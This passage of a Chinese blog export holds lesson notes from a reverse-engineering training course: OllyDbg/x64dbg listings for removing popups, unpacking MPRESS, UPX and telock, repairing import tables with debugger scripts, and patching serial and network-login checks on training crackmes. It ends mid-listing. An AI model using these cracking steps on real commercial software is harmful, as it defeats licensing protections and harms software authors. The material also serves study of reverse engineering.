第二课：再探弹窗暗桩\n\n这次是两个弹网页。依旧无壳，载入OD，发现查找字符串无果。查找所有模块间的调用，找到弹网页的函数`ShellExecuteA`，下断。\n\n```asm\n00445DD0  /$  68 F8114800   push 第二课.004811F8                        ; /Microsoft Internet Explorer\n00445DD5  |.  6A 00         push 0x0                                 ; |Class = 0x0\n00445DD7  |.  6A 00         push 0x0                                 ; |hAfterWnd = NULL\n00445DD9  |.  6A 00         push 0x0                                 ; |hParent = NULL\n00445DDB  |.  FF15 40654600 call dword ptr ds:[<&USER32.FindWindowEx>; \\FindWindowExA\n00445DE1  |.  8B4C24 04     mov ecx,dword ptr ss:[esp+0x4]\n00445DE5  |.  6A 01         push 0x1                                 ; /IsShown = 0x1\n00445DE7  |.  6A 00         push 0x0                                 ; |DefDir = NULL\n00445DE9  |.  6A 00         push 0x0                                 ; |Parameters = NULL\n00445DEB  |.  51            push ecx                                 ; |FileName = \"\u0006\"\n00445DEC  |.  68 F0114800   push 第二课.004811F0                        ; |open\n00445DF1  |.  50            push eax                                 ; |hWnd = 001631B8\n00445DF2  |.  FF15 84634600 call dword ptr ds:[<&SHELL32.ShellExecut>; \\ShellExecuteA\n00445DF8  \\.  C2 0400       retn 0x4\n```\n\n执行到返回，程序弹出一个网页。再经过这里一次，程序弹出第二个网页。\n\n```asm\n00445CD5   .  E8 3A150100   call 第二课.00457214\n00445CDA      8B4424 00     mov eax,dword ptr ss:[esp]\n00445CDE      8D4C24 04     lea ecx,dword ptr ss:[esp+0x4]\n00445CE2      50            push eax\n00445CE3      E8 E8000000   call 第二课.00445DD0                        ;  暗桩\n00445CE8   .  8D4C24 00     lea ecx,dword ptr ss:[esp]\n```\n\n所以只要将2-5行代码都nop掉，两个弹窗都没有了。但运行程序还是说暗桩已经触发。那有没有好一点的办法让它说没有触发呢？\n\n在数据窗口Ctrl+B搜索ASCII码“ www.52pojie.cn ”，下内存访问断点。运行单步\n\n```asm\n004010C4  /$  55            push ebp\n004010C5  |.  8BEC          mov ebp,esp\n004010C7  |.  81EC 04000000 sub esp,0x4\n004010CD  |.  68 010100A0   push 0xA0000101\n004010D2  |.  6A 00         push 0x0\n004010D4  |.  68 F87B4600   push 第二课.00467BF8\n004010D9  |.  68 01000000   push 0x1\n004010DE  |.  BB 10144000   mov ebx,第二课.00401410\n004010E3  |.  E8 B4010000   call 第二课.0040129C\n004010E8  |.  83C4 10       add esp,0x10\n004010EB  |.  8945 FC       mov [local.1],eax\n004010EE  |.  68 04000080   push 0x80000004\n004010F3  |.  6A 00         push 0x0\n004010F5  |.  8B45 FC       mov eax,[local.1]\n004010F8  |.  85C0          test eax,eax\n004010FA  |.  75 05         jnz short 第二课.00401101\n004010FC  |.  B8 0E7C4600   mov eax,第二课.00467C0E                     ;  ā\n00401101  |>  50            push eax\n00401102  |.  68 01000000   push 0x1\n00401107  |.  B8 01000000   mov eax,0x1\n0040110C  |.  BB B05C4400   mov ebx,第二课.00445CB0\n00401111  |.  E8 8C010000   call 第二课.004012A2                        ;  第一次弹窗\n```\n\n继续单步，`004010C4`就是第一次弹窗的位置，所以将这两个call指令nop掉即可。\n\n```asm\n004010A9  |.  83C4 04       add esp,0x4\n004010AC  |>  E8 13000000   call 第二课.004010C4                        ;  第一次弹窗\n004010B1  |.  E8 C3000000   call 第二课.00401179\n004010B6  |.  E8 C5000000   call 第二课.00401180                        ;  第二次弹窗\n004010BB  |.  E8 75010000   call 第二课.00401235\n```\n\n这次它说暗桩没有触发。\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第十课——x64平台脱壳与破解实战","url":"/posts/efe98763.html","content":"\n由于吾爱虚拟机是32位的，运行不了64位程序，所以这节课用物理机来操作。\n\n# 1. 课程例子\n\n拿到程序，先运行一下熟悉流程，再查壳，发现有MPRESS壳(压缩壳)。压缩壳在壳段开始的时候做的第一件事往往是`pushad`(保存寄存器)，在壳段结束的时候做的最后一件事是`popad`(还原寄存器)，所以我们可以用ESP定律脱压缩壳。但在64位的程序下，一般不会这么做。\n\n<!--more-->\n\n{% asset_img 查壳.png 查壳 %}\n\n将程序载入x64dbg，F9运行，去到标准的MPRESS的入口地址\n\n```asm\n000000014001B0C0 | 57                       | push rdi                                |\n000000014001B0C1 | 56                       | push rsi                                |\n000000014001B0C2 | 53                       | push rbx                                |\n000000014001B0C3 | 51                       | push rcx                                |\n000000014001B0C4 | 52                       | push rdx                                | rdx:EntryPoint\n000000014001B0C5 | 41:50                    | push r8                                |\n```\n\n既然有push，那肯定也有pop，找到下面这几句指令，也就找到出口了。\n\n```asm\npop r8\npop rdx\npop rcx\npop rbx\npop rsi\npop rdi\n```\n\n但现在找不到，因为MPRESS把壳段跳到OEP的那部分代码给压缩了，要等它解压到那部分代码才能找到。\n\n暂时先不管，单步跟踪试一下，到达一个跨区段的跳转`14001BBA7`。下面是空代码，上面有pop指令(但不是pop上面那几句)，很像UPX。\n\n```asm\n000000014001BB9A | 41:5F                    | pop r15                                 |\n000000014001BB9C | 41:5E                    | pop r14                                 |\n000000014001BB9E | 41:5D                    | pop r13                                 |\n000000014001BBA0 | 41:5C                    | pop r12                                 |\n000000014001BBA2 | 5F                       | pop rdi                                 |\n000000014001BBA3 | 5E                       | pop rsi                                 |\n000000014001BBA4 | 5D                       | pop rbp                                 |\n000000014001BBA5 | 5B                       | pop rbx                                 |\n000000014001BBA6 | C3                       | ret                                     |\n000000014001BBA7 | E9 1F00FFFF              | jmp demo.14000BBCB                      |\n000000014001BBAC | 54                       | push rsp                                |\n000000014001BBAD | 54                       | push rsp                                |\n000000014001BBAE | FE                       | ???                                     |\n000000014001BBAF | FF                       | ???                                     |\n000000014001BBB0 | FF                       | ???                                     |\n000000014001BBB1 | FF                       | ???                                     |\n000000014001BBB2 | FF                       | ???                                     |\n000000014001BBB3 | FF00                     | inc dword ptr ds:[rax]                  |\n000000014001BBB5 | 0000                     | add byte ptr ds:[rax],al                |\n000000014001BBB7 | 004D 73                  | add byte ptr ss:[rbp+73],cl             |\n000000014001BBBA | 0000                     | add byte ptr ds:[rax],al                |\n000000014001BBBC | 0000                     | add byte ptr ds:[rax],al                |\n```\n\n```asm\n41 5F 41 5E 41 5D 41 5C 5F 5E 5D 5B C3\n```\n\n执行完`jmp`后，MPRESS完成了第一次解压。\n\n```asm\n000000014000BBCB | 48:83EC 28               | sub rsp,28                              |\n000000014000BBCF | 48:0300                  | add rax,qword ptr ds:[rax]              |\n000000014000BBD2 | 0AC0                     | or al,al                                |\n000000014000BBD4 | 0F85 85000000            | jne demo.14000BC5F                      |\n000000014000BBDA | 48:2D 00100000           | sub rax,1000                            |\n```\n\n继续单步，到下面这一步跑飞，重载，再次运行到这里时F7进去这个call指令。\n\n```asm\n000000014000BBFB | E8 09000000              | call demo.14000BC09                     |;进去\n```\n\n再次跑飞，再进去单步\n\n```asm\n000000014000BC14 | E8 0F000000              | call demo.14000BC28                     |;进去\n```\n\n运行到此处，这几条pop与开头几条push对应，并且`jmp`是个大跳转。\n\n```asm\n000000014000BCD5 | 41:58                    | pop r8                                  |\n000000014000BCD7 | 5A                       | pop rdx                                 |\n000000014000BCD8 | 59                       | pop rcx                                 |\n000000014000BCD9 | 5B                       | pop rbx                                 |\n000000014000BCDA | 5E                       | pop rsi                                 |\n000000014000BCDB | 5F                       | pop rdi                                 |\n000000014000BCDC | E9 4F54FFFF              | jmp demo.140001130                      |\n```\n\n```asm\n41 58 5A 59 5B 5E 5F\n```\n\n执行这个跳转，这里就是64位的VS2013编译出来的OEP。\n\n```asm\n0000000140001130 | 48:83EC 28               | sub rsp,28                              | OEP\n0000000140001134 | E8 7B180000              | call demo.1400029B4                     |\n0000000140001139 | 48:83C4 28               | add rsp,28                              |\n000000014000113D | E9 02000000              | jmp demo.140001144                      |\n0000000140001142 | CC                       | int3                                    |\n0000000140001143 | CC                       | int3                                    |\n```\n\n用Scylla将程序dump再fix dump，完成脱壳。\n\n用脚本找OEP\n\n```asm\nerun\nfind rip,\"415F415E415D415C5F5E5D5BC3\"\t\t//搜索二进制\nmov first_jmp,$result\t\t\t\t\t\t//first_jmp=41(first_jmp指向pop r15那一行)\t\t\t\t\t\t\nadd first_jmp,D\t\t\t\t\t\t\t\t//first_jmp=first_jmp+D=E9(加上0xD个偏移到达jmp)\nbp first_jmp\t\t\t\t\t\t\t\t//在jmp下断\nerun\t\t\t\t\t\t\t\t\t\t//运行\nbc\t\t\t\t\t\t\t\t\t\t\t//取消断点\nsti\t\t\t\t\t\t\t\t\t\t\t//F8\nfind rip,\"41585A595B5E5F\"\nmov second_jmp,$result\nadd second_jmp,7\nbp second_jmp\nerun\nbc\nsti\t\t\t\t\t\t\t\t\t\t\t//OEP\nret\n```\n\n在脚本窗口中，右键->载入脚本，按空格直接运行脚本。\n\n很简单的一个破解，搜索字符串改个跳转即可，右键->补丁->修补文件，后缀名自己加上。\n\n如果是追码也很简单\n\n```asm\n000000014000104C | FF15 CEB10000            | call qword ptr ds:[<&GetDlgItemTextA>]  |\n0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        |\n0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | 00000001400112E8:\"Fuck L4Nce\"\n0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |\n0000000140001065 | 48:8BCB                  | mov rcx,rbx                             |\n0000000140001068 | 85C0                     | test eax,eax                            |\n000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |\n000000014000106C | 45:33C9                  | xor r9d,r9d                             |\n000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | r8:&\"吚x\\n€|$@\", 00000001400112F4:\"Boom!\"\n0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | 0000000140011300:\"Congratulations! You have successfully fucked L4Nce\"\n000000014000107D | EB 14                    | jmp demo_dump_scy.140001093             |\n000000014000107F | 41:B9 10000000           | mov r9d,10                              |\n0000000140001085 | 4C:8D05 AC020100         | lea r8,qword ptr ds:[140011338]         | r8:&\"吚x\\n€|$@\", 0000000140011338:\"Boomshakalaka\"\n000000014000108C | 48:8D15 B5020100         | lea rdx,qword ptr ds:[140011348]        | 0000000140011348:\"You Failed!\"\n```\n\n在`GetDlgItemTextA`函数下断，这个是获取我们输入的字符串。两次F9运行至主程序，输入假码提交，停在断点处。接下来单步\n\n```asm\n000000014000104C | FF15 CEB10000            | call qword ptr ds:[<&GetDlgItemTextA>]  |\n0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        | rdx:\"hhhhhhh\", 0000000140015820:\"hhhhhhh\"\n0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | rcx:\"Fuck L4Nce\", 00000001400112E8:\"Fuck L4Nce\"\n0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |\n0000000140001065 | 48:8BCB                  | mov rcx,rbx                             | rcx:\"Fuck L4Nce\"\n0000000140001068 | 85C0                     | test eax,eax                            |\n000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |\n000000014000106C | 45:33C9                  | xor r9d,r9d                             |\n000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | 00000001400112F4:\"Boom!\"\n0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | rdx:\"hhhhhhh\", 0000000140011300:\"Congratulations! You have successfully fucked L4Nce\"\n```\n\n很明显就是我们输入的字符串与`Fuck L4Nce`比较。\n\n如果想在64位下做补丁工具，推荐用IDA。将脱完壳的程序载入IDA，在Options->General勾选地址前缀和填上要显示的字节个数。\n\n{% asset_img 地址.png 地址和字节 %}\n\n在汇编窗口找到成功与失败的分岔路。\n\n{% asset_img jnz.png 分岔路 %}\n\n选中`jnz`指令，在界面上Edit->Patch program->Assemble，将jnz改为nop，由于jnz有两个字节，所以要连续修改两个nop。或者Edit->Patch program->Change word，写入0x9090。\n\n{% asset_img nop.png nop掉 %}\n\n现在可以看到，上面那块与左边那块合并了，而右边那块被独立出来，没有箭头指向右边那块了。\n\n然后Edit->Patch program->Apply patches to input file，输出窗口提示应用成功。\n\n{% asset_img 输出窗口.png 输出窗口 %}\n\n课后作业几乎与课程例子一模一样，所以不记笔记了。\n\n","categories":["Windows逆向"],"tags":["x64dbg","IDA","吾爱破解培训"]},{"title":"第八九课——深入浅出探讨脱壳细节","url":"/posts/4b9d65e0.html","content":"\n在做第五六课的打补丁作业时，遇到了在不脱壳的情况下修改程序。在复制到可执行文件时提示“无法定位数据”。这是因为程序加壳后，代码段显示全是空代码，我们修改代码时，系统执行将某代码1修改为某代码2，但系统在代码段找不到某代码1，所以提示“无法定位数据”。\n\n但如果我们将程序脱壳了，就可在程序上随意修改，所以脱壳的重要性就体现出来了。脱壳毁一生，破解穷三代(bushi)。\n\n<!--more-->\n\n**脱壳细节**\n\n1. 找OEP(只是万里长征的第一步)\n2. dump\n\n- 无法读取进程内存:换工具(Scylla不错)\n\n3. 修复IAT\n\n- 在此OEP入口没有找到任何有用信息:在你使用的工具选项中取消勾选使用来自磁盘的PE文件,还是不行换工具(Scylla)\n- 无效函数\n  - 剪切指针\n  - 跟踪级别1\n  - 跟踪级别3\n  - 插件跟踪\n  - 手动查找输入表(在OD中找)\n  - OD脚本\n\n程序的加载过程：程序被加载进内存里->系统根据程序的导入表，填充程序所需的API函数到程序的内存里(IAT：导入地址表)。\n\n壳：程序的导入表是静态可见的，包含了导入的DLL名称和其导入函数(用exeinfo可看)，有些壳会在加壳的时候把导入表结构取出，然后自行加密，或改变结构。这时系统找不到导入表，也就无法给程序填充所需的API函数地址。加过壳的程序一定是可以运行的，所以很明显这个填充过程被取代了，这个过程会在壳段完成。如果脱壳时直接dump，程序的导入表也就不在了，IAT所填充的函数地址是当前系统的地址，所以这个程序可能只能在脱壳的机器上运行。为了解决这个问题，import REC导入IAT地址值生成一份导入表，然后让程序使用新的导入表，程序可跨系统，在各个机器上与运行。但有些加密壳会使import REC失效，导致导入表无法修复。\n\n如何使import REC失效：\n\n```\n本来的函数调用\ncall addr_api\n\n某些壳会修改代码\ncall packspace(packspace:junkcode/无效操作/vm)\njmp addr_api\n```\n\n也就是间接调用API函数，使工具无法修复导入表。\n\n如何使import REC失效变为有效，将间接调用修改为直接调用，API有很多，所以不可能人工一个个API函数修改，而是用OD脚本。\n\n# 1. 熟悉OD脚本工具的使用\n\n在反汇编窗口右键->Script Functions->脚本运行窗口(或插件->ODbgScript->脚本运行窗口)打开脚本运行窗口。\n\n（1）右键->载入脚本，将写好的脚本打开调试脚本。\n\n（2）右键->运行脚本，将写好的脚本打开直接运行，不调试。\n\n编写OD脚本的工具：\n\n脚本的指令：\n\n```asm\nsti \t\t\t\t;F7\nsto\t\t\t\t\t;F8\nbp 地址\t   \t\t\t;F2\nrun\t\t\t\t\t;F9\nesto\t\t\t\t;Shift+F9\ngmi eip,CODEBASE\t;获取代码段地址\n```\n\n简单写一个脚本尝试一下，脚本通常为.txt和.osc格式。\n\n```asm\nsti\nsti\nsti\n```\n\n载入脚本后，会自动运行脚本的第1行，按Tab键执行脚本的下一行，按空格键直接运行脚本。\n\n{% asset_img 载入脚本.png 载入脚本 %}\n\n# 2. UPX的大表哥\n\n用普通的方法(单步跟踪、ESP定律、两次内存镜像等)就能找到OEP，关键在于修复IAT。\n\n1. 用importREC获取输入表，发现全都是无效函数，用跟踪级别1就可全部修复完。\n\n2. 编写OD脚本(这节课的重点)，OD脚本是基于汇编语言编写的。\n\n因为这个是UPX壳，有一个大跳转跳到OEP处。\n\n```asm\n00457765  - E9 4266FCFF     jmp upx的大?0041DDAC\n```\n\n编写到OEP的脚本\n\n```asm\nbp 00457765\t\t\t\t;在jmp下断点\nrun\t\t\t\t\t\t;F9运行至断点处\nsti\t\t\t\t\t\t;F7步入\nMSG \"OEP到了\"\t\t\t   ;弹窗提示OEP到了\nret\t\t\t\t\t\t;退出脚本\n```\n\n直接运行脚本\n\n{% asset_img 脚本弹窗.png 脚本弹窗 %}\n\n{% asset_img 脚本结束.png 脚本结束 %}\n\n但这个脚本仅限于当前程序且无重定位(如果当前程序有重定位，取消它的重定位即可)。相对来说，ESP定律的脚本更通用。\n\nESP定律是利用堆栈平衡找OEP的手段，首先要执行一条压栈指令来改变栈。等以后再次读取这个栈内容的时候，就说明有栈平衡的迹象，很有可能是栈的恢复。一般来说，压缩壳只有一次恢复，然后就到OEP了，利用这个特性来找OEP。\n\n```asm\nsti\t\t\t\t\t;执行pushad\nbphws esp,\"r\"\t\t;给esp下硬件断点\nrun\n```\n\n执行完3行脚本后运行到`00457758`。还没到达OEP。\n\n```asm\n00457758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]\n0045775C    6A 00           push 0x0\n0045775E    39C4            cmp esp,eax\n00457760  ^ 75 FA           jnz short upx的大?0045775C\n00457762    83EC 80         sub esp,-0x80\n00457765  - E9 4266FCFF     jmp upx的大?0041DDAC\n```\n\n再改进一下\n\n```asm\nsti\t\t\t\t\t;执行pushad\nbphws esp,\"r\"\t\t;给esp下硬件断点\nrun\nsti\nsti\nsti\t\t\t\t\t;到了jnz\nbp eip\n@LOOP:\nrun\ncmp esp,eax\njnz @LOOP\nsti\nsti\nsti\t\t\t\t\t;到OEP\nret\n```\n\nUPX的壳段代码是差不多的，这个脚本可以用来找这个UPX版本所有加壳程序的OEP，而且允许程序有重定位。\n\n到OEP的下一步是找IAT，除了一些特别变态的加密壳比如：Themida，SE，VMProtect，都可以找指令为`call dword...`(FF 15)，`jmp dword...`(FF 25)来找IAT。\n\n{% asset_img 找IAT.png 找IAT %}\n\n发现注释是空的，在反汇编窗口的那条指令跟进去，`push API函数地址`\n\n```asm\n00401077    FF15 28204300   call dword ptr ds:[0x432028]\n```\n\n```asm\n0096033C    68 88401877     push comctl32.InitCommonControlsEx\n00960341    C3              retn\n```\n\n这两条指令相当于`jmp InitCommonControlsEx `。很明显，把API函数调用改成自己的函数，然后在自己的函数里跳到真实的API地址。\n\n一般来说，间接调用API函数有两种方法：\n\n- 在指令二进制，直接带有地址(push)\n- 根据当前的eip加上指令中的偏移算出地址(jmp)\n\n虽然它注释是空的，但可以知道IAT的起始位置前面全是空数据，IAT结束时是与用户函数分隔。可以推测IAT起始地址为`432000`，结束地址为`432554`。\n\n继续改进脚本\n\n```asm\nmov iat_b,00432000\nmov iat_e,00432554\nsti\t\t\t\t\t;执行pushad\nbphws esp,\"r\"\t\t;给esp下硬件断点\nrun\nsti\nsti\nsti\t\t\t\t\t;到了jnz\nbp eip\n@LOOP:\nrun\ncmp esp,eax\njnz @LOOP\nsti\nsti\nsti\t\t\t\t\t;到OEP\n@IAT_LOOP:\nmov iat,[iat_b]\t\t;比如iat=[432000]\ncmp iat,0\t\t\t;修改不了空数据，所以要跳过\nje @NEXT_LOOP\nmov api,[iat+1]\t\t;比如api=[[432000]+1]=[68 88401877+1]=88401877\nmov [iat_b],api\t\t;重建iat\n@NEXT_LOOP:\nadd iat_b,4\ncmp iat_b,iat_e\njne @IAT_LOOP\nret\n```\n\n运行完脚本再dump下来完成脱壳。\n\n如果修改一个就不用脚本这么麻烦，双击下面这条指令复制API函数地址，去到对应的数据窗口地址修改其数值，右键->修改，粘贴API函数地址。\n\n```asm\n0096033C    68 88401877     push comctl32.InitCommonControlsEx\n```\n\n```asm\n00432028  0096033C\n修改为\n00432028  77184088  comctl32.InitCommonControlsEx\n```\n\n此时就可看到API函数了。\n\n# 3. 真假难辨\n\n用单步跟踪、两次内存镜像等都能找到OEP\n\n```asm\n00446021  /.  55            push ebp                                 ;  OEP\n00446022  |.  8BEC          mov ebp,esp\n00446024  |.  6A FF         push -0x1\n00446026  |.  68 70C04600   push 真假难辩.0046C070\n0044602B  |.  68 5CA84400   push 真假难辩.0044A85C                       ;  SE 处理程序安装\n00446030  |.  64:A1 0000000>mov eax,dword ptr fs:[0]\n```\n\n不会找IAT啊...不会写OD脚本...\n\n# 4. 课后作业\n\n查壳是telock的壳，用最后一次异常法到达OEP，不会去第一课找telock壳详解。也可以三次内存镜像`.text`->`.rdata`->`.text`直达OEP。\n\n```asm\n0045D4F6    55              push ebp\n0045D4F7    8BEC            mov ebp,esp\n0045D4F9    6A FF           push -0x1\n0045D4FB    68 28704800     push 第八九课.00487028\n0045D500    68 D4024600     push 第八九课.004602D4\n```\n\n方法一：重建IAT用插件跟踪，剩余4无效指针，直接剪切。程序正常运行。\n\n方法二：用OD脚本修复IAT，起始位置为`47D000`，结束位置为`47D6A0`。\n\n下面这个脚本很容易看得懂\n\n```asm\n;到达OEP才能用这个脚本\nmov iat_s, 0047d024\nmov iat_e, 0047d16c\n@LOOP1:\nmov iat,iat_s+663CFE\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP1\n \nmov iat_s,0047d16c\nmov iat_e,0047D374\n@LOOP2:\nmov iat,iat_s+644310\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP2\n \nmov iat_s,0047D384\nmov iat_e,0047D390\n@LOOP3:\nmov iat,iat_s+6A2CCE\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP3\n \nmov iat_s,0047D390\nmov iat_e,0047D600\n@LOOP4:\nmov iat,iat_s+654543\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP4\n\nMSG \"IAT修复完成！\"\nret\n```\n\n拿@LOOP1来说，`0047d024`的数值为`00AE0000`，Alt+M进入找地址为`00AE0000`的数据段，开头是一大段杂乱的数据，后面是空数据，紧接着又一段有规律的数据，再接着空数据。这段有规律的数据都是以`77`开头的，猜测是dll领空的API函数地址。 而`0047d024`与`00AE0D22`相差`663CFE`，所以要加上偏移`663CFE`即可得到API函数地址。@LOOP2到@LOOP4都同理。\n\n```asm\n00AE0D20   00 00 C0 6D F0 77 56 D2 EF 77 1D AF EF 77 FF 82  ..續饂V绎w\u001dw\n00AE0D30   EF 77 17 6D F2 77 F1 7C EF 77 74 78 EF 77 D9 B4  飛\u0017m騱駖飛tx飛俅\n00AE0D40   EF 77 71 5A EF 77 6D E4 EF 77 EF 61 EF 77 E0 5F  飛qZ飛m滹w颽飛郷\n00AE0D50   EF 77 70 5B EF 77 79 6F EF 77 3D 99 EF 77 BE 99  飛p[飛yo飛=欙w緳\n00AE0D60   EF 77 18 89 EF 77 1A E8 EF 77 A0 C7 F1 77 BB 9D  飛\u0018夛w\u001a栾w犌駑粷\n00AE0D70   EF 77 86 77 EF 77 77 DE EF 77 0F 84 EF 77 78 ED  飛唚飛w揎w\u000f勶wx\n00AE0D80   EF 77 A5 61 EF 77 C1 61 EF 77 2A EB EF 77 D1 86  飛飛羇飛*腼w褑\n00AE0D90   EF 77 41 9D EF 77 EE BB EF 77 F3 D7 EF 77 83 9A  飛A濓w罨飛笞飛儦\n00AE0DA0   EF 77 15 90 EF 77 B8 D9 F1 77 3A 71 F0 77 3D 8D  飛\u0015愶w纲駑:q饂=\n00AE0DB0   EF 77 0A 70 EF 77 31 DB F0 77 6E F3 F0 77 D2 34  飛.p飛1垧wn箴w?\n00AE0DC0   F0 77 5A 3F F2 77 5E EA EF 77 84 8E EF 77 65 34  饂Z?騱^觑w剮飛e4\n00AE0DD0   F0 77 D8 8E EF 77 C1 DD F0 77 60 BE EF 77 F2 4E  饂貛飛凛饂`撅w騈\n00AE0DE0   F2 77 38 67 F2 77 D8 D3 F0 77 58 D3 F0 77 5F 6E  騱8g騱赜饂X羽w_n\n00AE0DF0   EF 77 60 83 EF 77 23 D3 EF 77 FA 6B EF 77 A0 7A  飛`冿w#语w鷎飛爖\n00AE0E00   EF 77 D6 6A EF 77 D1 AB EF 77 D3 B8 EF 77 36 86  飛謏飛勋飛痈飛6\n00AE0E10   EF 77 7A D8 EF 77 D7 D8 F1 77 E3 71 F0 77 81 BE  飛z仫w棕駑鉸饂伨\n00AE0E20   EF 77 4C 7B EF 77 BE 95 EF 77 2C D7 EF 77 77 06  飛L{飛緯飛,罪ww\u0006\n00AE0E30   F0 77 DB 5E EF 77 01 7C EF 77 79 7C EF 77 BA 92  饂踍飛\u0001|飛y|飛簰\n00AE0E40   EF 77 B7 E8 EF 77 29 5E EF 77 EA C3 F0 77 89 63  飛疯飛)^飛昝饂塩\n00AE0E50   F2 77 40 97 EF 77 06 98 EF 77 77 5D EF 77 A1 6A  騱@楋w\u0006橈ww]飛\n00AE0E60   EF 77 A1 DD EF 77 2D A4 EF 77 00 00 00 00 00 00  飛≥飛-わw......\n00AE0E70   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n```\n\n用最后一次异常法到OEP和修复IAT，来自论坛苏紫方璇的脚本：(高级，看不懂就是了)\n\n```asm\nvar iat_b         ;iat起始位置\nvar iat_e         ;iat结束位置\nvar tmp           ;临时中转\nvar string        ;储存代码段自动跟踪命令\nvar oldesp        ;esp备份\nvar oldeip        ;eip备份\nvar codebegin     ;代码段起始地址\nvar codesize      ;代码段大小\n \ngmi eip,CODEBASE             ;获取代码段地址\nmov codebegin,$RESULT\ngmi eip,CODESIZE             ;获取代码段大小\nmov codesize,$RESULT\nadd codebegin,codesize       ;得到末尾地址\nmov string,\"eip < \"          ;构建自动跟踪指令\nadd string,codebegin\nmsg \"请取消所有的忽略异常\"\t;StrongOD中的skip some exceptions要勾选\nESTO\nESTO\nESTO\nESTO\nESTO\nESTO\nESTO                      ;最后一次异常法\nbphws [esp+4],\"x\"         ;Seh地址下硬件断点\nESTO                      ;Shift+F9\nbphwcall                  ;清除所有硬件断点\nTICND string              ;TICND \"eip < 47d000\"       ;tc eip<47d000\ncmt eip,\"程序入口点\"\nmsg \"找到入口点\"\n;IAT修复\nmov iat_b,0047D000\nmov iat_e,0047D6A0\nmov oldesp,esp           ;备份esp，eip\nmov oldeip,eip\n@ILoop:\nmov tmp,[iat_b]          ;tmp=原始iat表值\ncmp tmp,10000000\nja @Next                 ;若大于10000000就换下一个\ncmp tmp,00400000\nja @Start                ;若大于00400000就继续运行\ncmp tmp,0\njz @Next                 ;等于0就换下一个\n@Start:\nmov eip,tmp          \t;设定eip\nmov esp,oldesp       \t;恢复esp\nrtr                   \t;运行到返回\nmov [iat_b],[esp]      \t;修复IAT\n@Next:\nadd iat_b,4           \t;下一个iat\ncmp iat_b,iat_e       \t;判断是否结束\njnz @ILoop\nmov eip,oldeip        \t;恢复eip，esp\nmov esp,oldesp\nret\n```\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第七课——常见的网络验证","url":"/posts/a4cc5112.html","content":"\n# 1. 基础知识\n\n## 1.1 协议\n\n网络验证协议分为UDP和TCP协议。\n\n目前市面上流行的网络验证一半都是TCP协议的。\n\n采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv\n\n采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv\n\n<!--more-->\n\n在分析封包时，了解程序使用的协议类型，采用相对应抓包工具。有的抓包工具只能抓到TCP协议发送的封包数据，比如用易语言网截所写的抓包工具，那种工具只能抓到TCP协议的封包。\n\n## 1.2 网络验证类型\n\n网络验证类型常见的为：Asp验证，PHP验证，云验证，exe程序互相通信验证。\n\n判断验证类型的例子：\n\nAsp验证 飘零网络验证\n\nPHP验证 可可网络验证\n\n云验证  注册宝网络验证\n\n## 1.3 课程流程\n\n利用新浪微博建立一个简单的未加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件1)\n\n利用新浪微博建立一个简单的加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件2)\n\n讲解易语言编译出客户端，服务端验证形成过程\n\n未加密验证用户密码\n\nBASE64加密验证用户密码到期时间\n\n当程序无壳时，可以用查找字符串方法寻找敏感字符串；加壳时，可以用易语言的按钮事件：FF55FC5F5E(死码)，前提是这个程序是用易语言编写的。下断运行，F7步入就是主程序代码。\n\n# 2. 实例\n\n这些程序都是用易语言编写的，所以也可以当作是易语言专栏吧。\n\n## 2.1 网页未加密\n\n破解简单说下：\n\n程序运行一下知道大概流程，载入OD寻找敏感字符串。发现登录成功在很大的一个循环里，登录失败在循环外。\n\n```asm\n004025D7  |.  895D C0       |mov [local.16],ebx\n004025DA  |.  8B5D C0       |mov ebx,[local.16]\n004025DD  |.  FF33          |push dword ptr ds:[ebx]\n004025DF  |.  68 766C4800   |push 课件1_网.00486C76                     ;  到期时间：\n004025E4  |.  B9 02000000   |mov ecx,0x2\n004025E9  |.  E8 BEF4FFFF   |call 课件1_网.00401AAC\n004025EE  |.  83C4 08       |add esp,0x8\n004025F1  |.  8945 BC       |mov [local.17],eax\n004025F4  |.  6A 00         |push 0x0\n004025F6  |.  6A 00         |push 0x0\n004025F8  |.  6A 00         |push 0x0\n004025FA  |.  68 04000080   |push 0x80000004\n004025FF  |.  6A 00         |push 0x0\n00402601  |.  68 816C4800   |push 课件1_网.00486C81                     ;  登录成功\n00402606  |.  68 01030080   |push 0x80000301\n0040260B  |.  6A 00         |push 0x0\n0040260D  |.  68 00000000   |push 0x0\n00402612  |.  68 04000080   |push 0x80000004\n00402617  |.  6A 00         |push 0x0\n00402619  |.  8B45 BC       |mov eax,[local.17]\n```\n\n```asm\n00402655  |> \\83C4 0C       add esp,0xC\n00402658  |.  6A 00         push 0x0\n0040265A  |.  6A 00         push 0x0\n0040265C  |.  6A 00         push 0x0\n0040265E  |.  68 04000080   push 0x80000004\n00402663  |.  6A 00         push 0x0\n00402665  |.  68 8A6C4800   push 课件1_网.00486C8A                      ;  登录失败\n0040266A  |.  68 01030080   push 0x80000301\n0040266F  |.  6A 00         push 0x0\n00402671  |.  68 00000000   push 0x0\n00402676  |.  68 